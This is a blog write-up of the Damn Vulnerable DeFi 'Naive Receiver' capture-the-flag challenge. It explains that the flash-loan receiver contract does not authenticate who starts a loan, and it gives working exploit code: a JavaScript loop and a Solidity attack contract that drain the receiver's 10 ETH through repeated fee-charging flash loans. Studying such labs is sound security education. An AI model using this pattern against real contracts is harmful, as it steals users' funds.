---
title: Damn vulnerable defi Challenge2 naive receiver
date: 2023-03-22 19:02:31
tags:
  - solidity
  - damnvulnerabledefi
  - defi
  - CTFs
categories:
  - solidity
---

## overview

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
Take all ETH out of the user’s contract. If possible, in a single transaction.

### how to get it started

1. git clone [github repo](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0)
2. yarn install
3. fill your code in \*.challenge.js
4. run your script via hardhat tools

Let's jump into the naive receiver case solidity code:

## [[source code]](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/naive-receiver) consist of 2 solidity files:

- FlashLoanReceiver.sol
- NaiveReceiverLenderPool.sol

### code bug

The issue here is that the user contract does not authenticate the user to be the owner, so anyone can just take any flash loan on behalf of that contract.
We can interact with pool contract directly to drain user's contract like this:

```javascript
const ETH = await pool.ETH();
for (let i = 0; i < 10; i++) {
  await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
}
```

Or we can delpoy an attack contract to invoking pool contract:

```javascript
interface INaiveReceiverLenderPool{
    function fixedFee(address token, uint256) external pure returns (uint256);
    function flashLoan(address receiver,address token, uint256 amount,bytes calldata data) external returns (bool);
}

contract AttackContract {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(INaiveReceiverLenderPool pool,address payable receiver) external {
        for(uint i=0;i<10;i++){
            pool.flashLoan(receiver, ETH,0,"0x");
        }
    }
}
```

After we deployed the attack contract,invoke it using javascript

```javascript
const AttackFactory = await ethers.getContractFactory("AttackContract", player);
attack = await AttackFactory.deploy();
await attack.attack(pool.address, receiver.address);
```
